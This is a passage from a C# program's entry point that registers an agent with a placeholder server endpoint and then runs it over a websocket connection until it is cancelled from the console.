    }


    class Program
    {
        static async Task Main(string[] args)
        {
            Agent agent = new Agent();

            Uri registrationUri = new Uri("https://xxx.xxx.com/api/agents/register");
            Uri wsUri = new Uri("wss://xxx.xxx.com/ws/agents");
            try
            {
                await agent.RegisterAsync(registrationUri);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[Program] Registration error: " + ex.Message);
                return;
            }
            using (var cancellationTokenSource = new CancellationTokenSource())
            {
                Console.CancelKeyPress += (sender, eventArgs) =>
                {
                    eventArgs.Cancel = true;
                    cancellationTokenSource.Cancel();
                };
                await agent.RunAsync(wsUri, cancellationTokenSource.Token);
            }
            Console.WriteLine("[Program] Agent terminated.");
        }
    }
}
